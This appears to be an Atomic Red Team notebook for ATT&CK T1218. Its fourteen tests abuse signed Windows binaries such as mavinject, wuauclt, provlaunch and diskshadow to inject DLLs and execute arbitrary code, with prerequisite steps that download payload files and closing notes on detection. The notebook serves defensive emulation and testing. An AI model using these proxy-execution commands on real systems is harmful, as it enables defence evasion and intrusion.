{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e5688290",
   "metadata": {},
   "source": "# T1218 - System Binary Proxy Execution\nAdversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)"
  },
  {
   "cell_type": "markdown",
   "id": "6c8cb557",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "bf29b545",
   "metadata": {},
   "source": "### Atomic Test #1 - mavinject - Inject DLL into running process\nInjects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: T1218.dll must exist on disk at specified location (#{dll_payload})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll\" -OutFile \"PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4998b24f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "b9a1e412",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nmavinject.exe 1000 /INJECTRUNNING \"PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bb6b4e10",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "82bdb485",
   "metadata": {},
   "source": "### Atomic Test #2 - Register-CimProvider - Execute evil dll\nExecute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: T1218-2.dll must exist on disk at specified location (#{dll_payload})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2b732f2d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "3d4404fa",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\Windows\\SysWow64\\Register-CimProvider.exe -Path \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "71e81f98",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "3abfdaad",
   "metadata": {},
   "source": "### Atomic Test #3 - InfDefaultInstall.exe .inf Execution\nTest execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: INF file must exist on disk at specified location (#{inf_to_execute})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf\" -OutFile \"PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "91e8d93a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f391db28",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nInfDefaultInstall.exe \"PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8401c963",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "eae83939",
   "metadata": {},
   "source": "### Atomic Test #4 - ProtocolHandler.exe Downloaded a Suspicious File\nEmulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft Word must be installed\n\n##### Check Prereq Commands:\n```cmd\ntry {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```cmd\nWrite-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "85bc2317",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "32fe291b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nFOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9a14fa43",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "3c08e7c4",
   "metadata": {},
   "source": "### Atomic Test #5 - Microsoft.Workflow.Compiler.exe Payload Execution\nEmulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: .Net must be installed for this test to work correctly.\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\microsoft.workflow.compiler.exe ) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nwrite-host \".Net must be installed for this test to work correctly.\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1691bb65",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d38d9638",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\microsoft.workflow.compiler.exe \"PathToAtomicsFolder\\T1218\\src\\T1218.xml\" output.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "281b1fa6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "33050058",
   "metadata": {},
   "source": "### Atomic Test #6 - Renamed Microsoft.Workflow.Compiler.exe Payload Executions\nEmulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: .Net must be installed for this test to work correctly.\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\svchost.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nCopy-Item C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\microsoft.workflow.compiler.exe \"PathToAtomicsFolder\\..\\ExternalPayloads\\svchost.exe\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "92fc1efe",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "52125b21",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n&\"PathToAtomicsFolder\\..\\ExternalPayloads\\svchost.exe\" \"PathToAtomicsFolder\\T1218\\src\\T1218.xml\" output.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4d6928a3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "057b1625",
   "metadata": {},
   "source": "### Atomic Test #7 - Invoke-ATHRemoteFXvGPUDisablementCommand base test\nRemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHRemoteFXvGPUDisablementCommand must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "71589be8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "5f4be007",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $PWD```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "390fe603",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "ba3701a3",
   "metadata": {},
   "source": "### Atomic Test #8 - DiskShadow Command Execution\nEmulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: txt file must exist on disk at specified location (#{txt_payload})\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1218\\src\\T1218.txt\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218\\src\\T1218.txt\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt\" -OutFile \"PathToAtomicsFolder\\T1218\\src\\T1218.txt\"\n\n```\n##### Description: DiskShadow.exe must exist on disk at specified location (#{dspath})\n##### Check Prereq Commands:\n```powershell\nif (Test-Path C:\\Windows\\System32\\diskshadow.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\necho \"DiskShadow.exe not found on disk at expected location\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "da7e647e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "8d080f66",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nC:\\Windows\\System32\\diskshadow.exe -S PathToAtomicsFolder\\T1218\\src\\T1218.txt \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "47f278bc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "4ea830cd",
   "metadata": {},
   "source": "### Atomic Test #9 - Load Arbitrary DLL via Wuauclt (Windows Update Client)\nThis test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: DLL to load must exist on disk as specified location (#{arbitrary_dll})\n\n##### Check Prereq Commands:\n```cmd\nif (test-path \"PathToAtomicsFolder\\T1218\\bin\\calc.dll\"){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218\\bin\\calc.dll\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true\" -OutFile \"PathToAtomicsFolder\\T1218\\bin\\calc.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7a3e61ea",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "9e051d8e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwuauclt.exe /UpdateDeploymentProvider \"PathToAtomicsFolder\\T1218\\bin\\calc.dll\" /RunHandlerComServer\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "df56f84b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "396041de",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ntaskkill /f /im calculator.exe > nul 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "087cf82c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d036feb0",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Lolbin Gpscript logon option",
    "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nGpscript /logon\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5c06e080",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "c9ef47c5",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - Lolbin Gpscript startup option",
    "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nGpscript /startup\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "16a25cf5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "5d63e2fd",
   "metadata": {},
   "source": "### Atomic Test #12 - Lolbas ie4uinit.exe use as proxy\nExecutes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: ieuinit.inf must exist on disk at specified location (#{Path_inf})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218\\src\\ieuinit.inf\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218\\src\\ieuinit.inf\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf\" -OutFile \"PathToAtomicsFolder\\T1218\\src\\ieuinit.inf\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c6ee63b1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 12 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "8143f323",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncopy c:\\windows\\system32\\ie4uinit.exe %TEMP%\\ie4uinit.exe\ncopy \"PathToAtomicsFolder\\T1218\\src\\ieuinit.inf\" %TEMP%\\ieuinit.inf\n%TEMP%\\ie4uinit.exe -BaseSettings\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6f4dabfe",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "9174425f",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %TEMP%\\ie4uinit.exe >nul 2>&1\ndel %TEMP%\\ieuinit.inf >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bc79139d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "96019492",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - LOLBAS CustomShellHost to Spawn Process",
    "This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\\windows\\system32\\` to `C:\\temp\\`, renaming `calc.exe` to `explorer.exe`.\nUpon execution, customshellhost.exe will spawn calc.exe.\nNote this will only work on Windows 10 or 11.\n[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)\n[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nif (-not (Test-Path C:\\test)) {\nNew-Item -Path C:\\test -ItemType Directory\n} else {\nWrite-Host \"Directory C:\\test already exists.\" }\nCopy-Item -Path \"C:\\windows\\system32\\customshellhost.exe\" -Destination \"C:\\test\\customshellhost.exe\" -Force\nCopy-Item -Path \"C:\\windows\\system32\\calc.exe\" -Destination \"C:\\test\\explorer.exe\" -Force\nC:\\test\\customshellhost.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c35b4365",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "1ee8b8f4",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path C:\\test -Recurse -Force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2257e5bd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 13 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "bc13b744",
   "metadata": {},
   "source": [
    "### Atomic Test #14 - Provlaunch.exe Executes Arbitrary Command via Registry Key",
    "Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.\n- https://twitter.com/0gtweet/status/1674399582162153472\n- https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/\nRegistry keys are deleted after successful execution.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0\nreg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe\nc:\\windows\\system32\\provlaunch.exe LOLBin\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d9924d0a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "2be5e5fc",
   "metadata": {},
   "source": "## Detection\nMonitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity."
  },
  {
   "cell_type": "markdown",
   "id": "4d6621fe",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Software Manipulation \n Make changes to a system's software properties and functions to achieve a desired effect. \n\n Software Manipulation allows a defender to alter or replace elements of the operating system, file system, or any other software installed and executed on a system.\n#### Opportunity\nThere is an opportunity to block an adversary's intended action and force them to reveal additional TTPs.\n#### Use Case\nA defender can monitor operating system functions calls to look for adversary use and/or abuse.\n\n#### Procedures\nHook the Win32 Sleep() function so that it always performs a Sleep(1) instead of the intended duration. This can increase the speed at which dynamic analysis can be performed when a normal malicious file sleeps for long periods before attempting additional capabilities.\nHook the Win32 NetUserChangePassword() and modify it such that the new password is different from the one provided. The data passed into the function is encrypted along with the modified new password, then logged so a defender can get alerted about the change as well as decrypt the new password for use.\nAlter the output of an adversary's profiling commands to make newly-built systems look like the operating system was installed months earlier.\nAlter the output of adversary recon commands to not show important assets, such as a file server containing sensitive data.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}